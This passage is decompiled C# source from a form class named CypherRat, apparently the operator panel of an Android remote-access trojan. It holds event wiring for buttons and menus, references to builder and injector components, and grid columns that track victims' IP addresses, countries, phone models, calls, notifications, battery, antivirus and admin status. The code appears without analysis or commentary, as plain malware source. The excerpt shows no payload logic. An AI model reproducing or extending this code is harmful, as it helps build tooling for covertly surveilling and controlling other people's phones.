			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem17_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem17;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem17 = value;
				toolStripMenuItem = this._ToolStripMenuItem17;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000218 RID: 536
		// (get) Token: 0x06000802 RID: 2050 RVA: 0x00005A15 File Offset: 0x00003C15
		// (set) Token: 0x06000803 RID: 2051 RVA: 0x0003E3D4 File Offset: 0x0003C5D4
		internal virtual ToolStripMenuItem ToolStripMenuItem18
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem18;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem18_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem18;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem18 = value;
				toolStripMenuItem = this._ToolStripMenuItem18;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000219 RID: 537
		// (get) Token: 0x06000804 RID: 2052 RVA: 0x00005A1D File Offset: 0x00003C1D
		// (set) Token: 0x06000805 RID: 2053 RVA: 0x0003E418 File Offset: 0x0003C618
		internal virtual ToolStripMenuItem ToolStripMenuItem11
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem11;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem11_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem11;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem11 = value;
				toolStripMenuItem = this._ToolStripMenuItem11;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700021A RID: 538
		// (get) Token: 0x06000806 RID: 2054 RVA: 0x00005A25 File Offset: 0x00003C25
		// (set) Token: 0x06000807 RID: 2055 RVA: 0x0003E45C File Offset: 0x0003C65C
		internal virtual ToolStripSeparator ToolStripSeparator8 { get; set; }

		// Token: 0x1700021B RID: 539
		// (get) Token: 0x06000808 RID: 2056 RVA: 0x00005A2D File Offset: 0x00003C2D
		// (set) Token: 0x06000809 RID: 2057 RVA: 0x0003E470 File Offset: 0x0003C670
		internal virtual ToolStripMenuItem KeyboardToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._KeyboardToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.KeyboardToolStripMenuItem_Click);
				ToolStripMenuItem keyboardToolStripMenuItem = this._KeyboardToolStripMenuItem;
				if (keyboardToolStripMenuItem != null)
				{
					keyboardToolStripMenuItem.Click -= value2;
				}
				this._KeyboardToolStripMenuItem = value;
				keyboardToolStripMenuItem = this._KeyboardToolStripMenuItem;
				if (keyboardToolStripMenuItem != null)
				{
					keyboardToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700021C RID: 540
		// (get) Token: 0x0600080A RID: 2058 RVA: 0x00005A35 File Offset: 0x00003C35
		// (set) Token: 0x0600080B RID: 2059 RVA: 0x0003E4B4 File Offset: 0x0003C6B4
		internal virtual ToolStripSeparator ToolStripSeparator4 { get; set; }

		// Token: 0x1700021D RID: 541
		// (get) Token: 0x0600080C RID: 2060 RVA: 0x00005A3D File Offset: 0x00003C3D
		// (set) Token: 0x0600080D RID: 2061 RVA: 0x0003E4C8 File Offset: 0x0003C6C8
		internal virtual ToolStripMenuItem ClientFolderToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ClientFolderToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ClientFolderToolStripMenuItem_Click);
				ToolStripMenuItem clientFolderToolStripMenuItem = this._ClientFolderToolStripMenuItem;
				if (clientFolderToolStripMenuItem != null)
				{
					clientFolderToolStripMenuItem.Click -= value2;
				}
				this._ClientFolderToolStripMenuItem = value;
				clientFolderToolStripMenuItem = this._ClientFolderToolStripMenuItem;
				if (clientFolderToolStripMenuItem != null)
				{
					clientFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700021E RID: 542
		// (get) Token: 0x0600080E RID: 2062 RVA: 0x00005A45 File Offset: 0x00003C45
		// (set) Token: 0x0600080F RID: 2063 RVA: 0x0003E50C File Offset: 0x0003C70C
		internal virtual DrakeUIDataGridView ClientsWindow
		{
			[CompilerGenerated]
			get
			{
				return this._ClientsWindow;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.ClientsWindow_CellContentClick);
				DataGridViewCellEventHandler value3 = new DataGridViewCellEventHandler(this.ClientsWindow_CellContentClick);
				DrakeUIDataGridView clientsWindow = this._ClientsWindow;
				if (clientsWindow != null)
				{
					clientsWindow.CellClick -= value2;
					clientsWindow.CellContentClick -= value3;
				}
				this._ClientsWindow = value;
				clientsWindow = this._ClientsWindow;
				if (clientsWindow != null)
				{
					clientsWindow.CellClick += value2;
					clientsWindow.CellContentClick += value3;
				}
			}
		}

		// Token: 0x1700021F RID: 543
		// (get) Token: 0x06000810 RID: 2064 RVA: 0x00005A4D File Offset: 0x00003C4D
		// (set) Token: 0x06000811 RID: 2065 RVA: 0x0003E56C File Offset: 0x0003C76C
		internal virtual Panel Panel6 { get; set; }

		// Token: 0x17000220 RID: 544
		// (get) Token: 0x06000812 RID: 2066 RVA: 0x00005A55 File Offset: 0x00003C55
		// (set) Token: 0x06000813 RID: 2067 RVA: 0x0003E580 File Offset: 0x0003C780
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon3_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon3 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000221 RID: 545
		// (get) Token: 0x06000814 RID: 2068 RVA: 0x00005A5D File Offset: 0x00003C5D
		// (set) Token: 0x06000815 RID: 2069 RVA: 0x0003E5C4 File Offset: 0x0003C7C4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon4;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon4_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon4 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000222 RID: 546
		// (get) Token: 0x06000816 RID: 2070 RVA: 0x00005A65 File Offset: 0x00003C65
		// (set) Token: 0x06000817 RID: 2071 RVA: 0x0003E608 File Offset: 0x0003C808
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon6
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon6;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon6_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon6;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon6 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon6;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000223 RID: 547
		// (get) Token: 0x06000818 RID: 2072 RVA: 0x00005A6D File Offset: 0x00003C6D
		// (set) Token: 0x06000819 RID: 2073 RVA: 0x0003E64C File Offset: 0x0003C84C
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon5
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon5;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon5_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon5 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon5;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000224 RID: 548
		// (get) Token: 0x0600081A RID: 2074 RVA: 0x00005A75 File Offset: 0x00003C75
		// (set) Token: 0x0600081B RID: 2075 RVA: 0x0003E690 File Offset: 0x0003C890
		internal virtual Panel Panel8 { get; set; }

		// Token: 0x17000225 RID: 549
		// (get) Token: 0x0600081C RID: 2076 RVA: 0x00005A7D File Offset: 0x00003C7D
		// (set) Token: 0x0600081D RID: 2077 RVA: 0x0003E6A4 File Offset: 0x0003C8A4
		internal virtual Label Label1 { get; set; }

		// Token: 0x17000226 RID: 550
		// (get) Token: 0x0600081E RID: 2078 RVA: 0x00005A85 File Offset: 0x00003C85
		// (set) Token: 0x0600081F RID: 2079 RVA: 0x0003E6B8 File Offset: 0x0003C8B8
		internal virtual DrakeUIButtonIcon Clients_Btn
		{
			[CompilerGenerated]
			get
			{
				return this._Clients_Btn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clients_Btn_Click);
				DrakeUIButtonIcon clients_Btn = this._Clients_Btn;
				if (clients_Btn != null)
				{
					clients_Btn.Click -= value2;
				}
				this._Clients_Btn = value;
				clients_Btn = this._Clients_Btn;
				if (clients_Btn != null)
				{
					clients_Btn.Click += value2;
				}
			}
		}

		// Token: 0x17000227 RID: 551
		// (get) Token: 0x06000820 RID: 2080 RVA: 0x00005A8D File Offset: 0x00003C8D
		// (set) Token: 0x06000821 RID: 2081 RVA: 0x0003E6FC File Offset: 0x0003C8FC
		internal virtual DrakeUIButtonIcon blockbtn
		{
			[CompilerGenerated]
			get
			{
				return this._blockbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.blockbtn_Click);
				DrakeUIButtonIcon blockbtn = this._blockbtn;
				if (blockbtn != null)
				{
					blockbtn.Click -= value2;
				}
				this._blockbtn = value;
				blockbtn = this._blockbtn;
				if (blockbtn != null)
				{
					blockbtn.Click += value2;
				}
			}
		}

		// Token: 0x17000228 RID: 552
		// (get) Token: 0x06000822 RID: 2082 RVA: 0x00005A95 File Offset: 0x00003C95
		// (set) Token: 0x06000823 RID: 2083 RVA: 0x0003E740 File Offset: 0x0003C940
		internal virtual DrakeUIButtonIcon Connection_btn
		{
			[CompilerGenerated]
			get
			{
				return this._Connection_btn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Connection_btn_Click);
				DrakeUIButtonIcon connection_btn = this._Connection_btn;
				if (connection_btn != null)
				{
					connection_btn.Click -= value2;
				}
				this._Connection_btn = value;
				connection_btn = this._Connection_btn;
				if (connection_btn != null)
				{
					connection_btn.Click += value2;
				}
			}
		}

		// Token: 0x17000229 RID: 553
		// (get) Token: 0x06000824 RID: 2084 RVA: 0x00005A9D File Offset: 0x00003C9D
		// (set) Token: 0x06000825 RID: 2085 RVA: 0x0003E784 File Offset: 0x0003C984
		internal virtual DataGridViewImageColumn cliscren { get; set; }

		// Token: 0x1700022A RID: 554
		// (get) Token: 0x06000826 RID: 2086 RVA: 0x00005AA5 File Offset: 0x00003CA5
		// (set) Token: 0x06000827 RID: 2087 RVA: 0x0003E798 File Offset: 0x0003C998
		internal virtual DataGridViewImageColumn cliav { get; set; }

		// Token: 0x1700022B RID: 555
		// (get) Token: 0x06000828 RID: 2088 RVA: 0x00005AAD File Offset: 0x00003CAD
		// (set) Token: 0x06000829 RID: 2089 RVA: 0x0003E7AC File Offset: 0x0003C9AC
		internal virtual DataGridViewImageColumn cliflg { get; set; }

		// Token: 0x1700022C RID: 556
		// (get) Token: 0x0600082A RID: 2090 RVA: 0x00005AB5 File Offset: 0x00003CB5
		// (set) Token: 0x0600082B RID: 2091 RVA: 0x0003E7C0 File Offset: 0x0003C9C0
		internal virtual DataGridViewTextBoxColumn cliname { get; set; }

		// Token: 0x1700022D RID: 557
		// (get) Token: 0x0600082C RID: 2092 RVA: 0x00005ABD File Offset: 0x00003CBD
		// (set) Token: 0x0600082D RID: 2093 RVA: 0x0003E7D4 File Offset: 0x0003C9D4
		internal virtual DataGridViewTextBoxColumn clicountry { get; set; }

		// Token: 0x1700022E RID: 558
		// (get) Token: 0x0600082E RID: 2094 RVA: 0x00005AC5 File Offset: 0x00003CC5
		// (set) Token: 0x0600082F RID: 2095 RVA: 0x0003E7E8 File Offset: 0x0003C9E8
		internal virtual DataGridViewTextBoxColumn cliip { get; set; }

		// Token: 0x1700022F RID: 559
		// (get) Token: 0x06000830 RID: 2096 RVA: 0x00005ACD File Offset: 0x00003CCD
		// (set) Token: 0x06000831 RID: 2097 RVA: 0x0003E7FC File Offset: 0x0003C9FC
		internal virtual DataGridViewTextBoxColumn andver { get; set; }

		// Token: 0x17000230 RID: 560
		// (get) Token: 0x06000832 RID: 2098 RVA: 0x00005AD5 File Offset: 0x00003CD5
		// (set) Token: 0x06000833 RID: 2099 RVA: 0x0003E810 File Offset: 0x0003CA10
		internal virtual DataGridViewTextBoxColumn phondmod { get; set; }

		// Token: 0x17000231 RID: 561
		// (get) Token: 0x06000834 RID: 2100 RVA: 0x00005ADD File Offset: 0x00003CDD
		// (set) Token: 0x06000835 RID: 2101 RVA: 0x0003E824 File Offset: 0x0003CA24
		internal virtual DataGridViewImageColumn clinoti { get; set; }

		// Token: 0x17000232 RID: 562
		// (get) Token: 0x06000836 RID: 2102 RVA: 0x00005AE5 File Offset: 0x00003CE5
		// (set) Token: 0x06000837 RID: 2103 RVA: 0x0003E838 File Offset: 0x0003CA38
		internal virtual DataGridViewImageColumn clicalls { get; set; }

		// Token: 0x17000233 RID: 563
		// (get) Token: 0x06000838 RID: 2104 RVA: 0x00005AED File Offset: 0x00003CED
		// (set) Token: 0x06000839 RID: 2105 RVA: 0x0003E84C File Offset: 0x0003CA4C
		internal virtual DataGridViewImageColumn clibtry { get; set; }

		// Token: 0x17000234 RID: 564
		// (get) Token: 0x0600083A RID: 2106 RVA: 0x00005AF5 File Offset: 0x00003CF5
		// (set) Token: 0x0600083B RID: 2107 RVA: 0x0003E860 File Offset: 0x0003CA60
		internal virtual DataGridViewImageColumn cliwifi { get; set; }

		// Token: 0x17000235 RID: 565
		// (get) Token: 0x0600083C RID: 2108 RVA: 0x00005AFD File Offset: 0x00003CFD
		// (set) Token: 0x0600083D RID: 2109 RVA: 0x0003E874 File Offset: 0x0003CA74
		internal virtual DataGridViewTextBoxColumn cliavt { get; set; }

		// Token: 0x17000236 RID: 566
		// (get) Token: 0x0600083E RID: 2110 RVA: 0x00005B05 File Offset: 0x00003D05
		// (set) Token: 0x0600083F RID: 2111 RVA: 0x0003E888 File Offset: 0x0003CA88
		internal virtual DataGridViewTextBoxColumn defcli { get; set; }

		// Token: 0x17000237 RID: 567
		// (get) Token: 0x06000840 RID: 2112 RVA: 0x00005B0D File Offset: 0x00003D0D
		// (set) Token: 0x06000841 RID: 2113 RVA: 0x0003E89C File Offset: 0x0003CA9C
		internal virtual DataGridViewImageColumn isadmincli { get; set; }

		// Token: 0x17000238 RID: 568
		// (get) Token: 0x06000842 RID: 2114 RVA: 0x00005B15 File Offset: 0x00003D15
		// (set) Token: 0x06000843 RID: 2115 RVA: 0x0003E8B0 File Offset: 0x0003CAB0
		internal virtual DataGridViewTextBoxColumn clipng { get; set; }

		// Token: 0x17000239 RID: 569
		// (get) Token: 0x06000844 RID: 2116 RVA: 0x00005B1D File Offset: 0x00003D1D
		// (set) Token: 0x06000845 RID: 2117 RVA: 0x0003E8C4 File Offset: 0x0003CAC4
		internal virtual DrakeUIAvatar DrakeUIAvatar1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIAvatar1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIAvatar1_Click);
				DrakeUIAvatar drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click -= value2;
				}
				this._DrakeUIAvatar1 = value;
				drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click += value2;
				}
			}
		}

		// Token: 0x1700023A RID: 570
		// (get) Token: 0x06000846 RID: 2118 RVA: 0x00005B25 File Offset: 0x00003D25
		// (set) Token: 0x06000847 RID: 2119 RVA: 0x0003E908 File Offset: 0x0003CB08
		internal virtual ToolStripMenuItem ToolStripMenuItem14
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem14;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem14_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem14;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem14 = value;
				toolStripMenuItem = this._ToolStripMenuItem14;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000848 RID: 2120 RVA: 0x0003E94C File Offset: 0x0003CB4C
		[CompilerGenerated]
		private Task method_147()
		{
			return this.method_5();
		}

		// Token: 0x04000360 RID: 864
		public string string_0;

		// Token: 0x04000361 RID: 865
		public List<GClass7> gclass7s_0;

		// Token: 0x04000362 RID: 866
		private string string_1;

		// Token: 0x04000363 RID: 867
		public bool bool_0;

		// Token: 0x04000364 RID: 868
		public static bool bool_1 = true;

		// Token: 0x04000365 RID: 869
		public static int int_0 = 1;

		// Token: 0x04000366 RID: 870
		public object object_0;

		// Token: 0x04000367 RID: 871
		private int int_1;

		// Token: 0x04000368 RID: 872
		private int int_2;

		// Token: 0x04000369 RID: 873
		private int int_3;

		// Token: 0x0400036A RID: 874
		private int int_4;

		// Token: 0x0400036B RID: 875
		private bool bool_2;

		// Token: 0x0400036C RID: 876
		public string string_2;

		// Token: 0x0400036D RID: 877
		public string string_3;

		// Token: 0x0400036E RID: 878
		public string string_4;

		// Token: 0x0400036F RID: 879
		public string string_5;

		// Token: 0x04000370 RID: 880
		public string BRTHRRTBSA;

		// Token: 0x04000371 RID: 881
		public Ports ports_0;

		// Token: 0x04000372 RID: 882
		public GeoMap geoMap_0;

		// Token: 0x04000373 RID: 883
		public Dictionary<string, double> dictionary_0;

		// Token: 0x04000374 RID: 884
		private CraxsAbout craxsAbout_0;

		// Token: 0x04000375 RID: 885
		public Build build_0;

		// Token: 0x04000376 RID: 886
		public CraxsStore craxsStore_0;

		// Token: 0x04000377 RID: 887
		public BackgroundWorker[] backgroundWorkers_0;

		// Token: 0x04000378 RID: 888
		private object object_1;

		// Token: 0x04000379 RID: 889
		public GClass0 gclass0_0;

		// Token: 0x0400037A RID: 890
		public string string_6;

		// Token: 0x0400037B RID: 891
		public Win_Users win_Users_0;

		// Token: 0x0400037C RID: 892
		public object object_2;

		// Token: 0x0400037D RID: 893
		private CraxsSettings craxsSettings_0;

		// Token: 0x0400037E RID: 894
		private string string_7;

		// Token: 0x0400037F RID: 895
		private string string_8;

		// Token: 0x04000380 RID: 896
		public Jector jector_0;

		// Token: 0x04000381 RID: 897
		public bool bool_3;

		// Token: 0x04000382 RID: 898
		private List<DataGridViewRow> dataGridViewRows_0;

		// Token: 0x04000383 RID: 899
		public Random random_0;

		// Token: 0x02000095 RID: 149
		// (Invoke) Token: 0x0600084C RID: 2124
		public delegate void GDelegate8(object[] objects_0);

		// Token: 0x02000096 RID: 150
		// (Invoke) Token: 0x06000850 RID: 2128
		public delegate void GDelegate9(object[] objects_0);

		// Token: 0x02000097 RID: 151
		// (Invoke) Token: 0x06000854 RID: 2132
		public delegate void GDelegate10(object[] objects_0);

		// Token: 0x02000098 RID: 152
		// (Invoke) Token: 0x06000858 RID: 2136
		public delegate void GDelegate11(object[] objects_0);

		// Token: 0x02000099 RID: 153
		// (Invoke) Token: 0x0600085C RID: 2140
		public delegate void GDelegate12(object[] objects_0);

		// Token: 0x0200009A RID: 154
		// (Invoke) Token: 0x06000860 RID: 2144
		public delegate void GDelegate13(object[] objects_0);

		// Token: 0x0200009B RID: 155
		// (Invoke) Token: 0x06000864 RID: 2148
		public delegate void GDelegate14(object[] objects_0);

		// Token: 0x0200009C RID: 156
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class8
		{
			// Token: 0x06000867 RID: 2151 RVA: 0x0003E97C File Offset: 0x0003CB7C
			internal void method_0()
			{
				try
				{
					do
					{
						if (!GClass9.bool_0)
						{
							GClass9.bool_0 = Module2.smethod_39();
						}
						Thread.Sleep(25000);
					}
					while (!GClass9.bool_0);
				}
				catch (Exception ex)
				{
				}
			}

			// Token: 0x04000433 RID: 1075
			public static readonly CypherRat.Class8 class8_0 = new CypherRat.Class8();

			// Token: 0x04000434 RID: 1076
			public static ThreadStart threadStart_0;
		}
	}
}
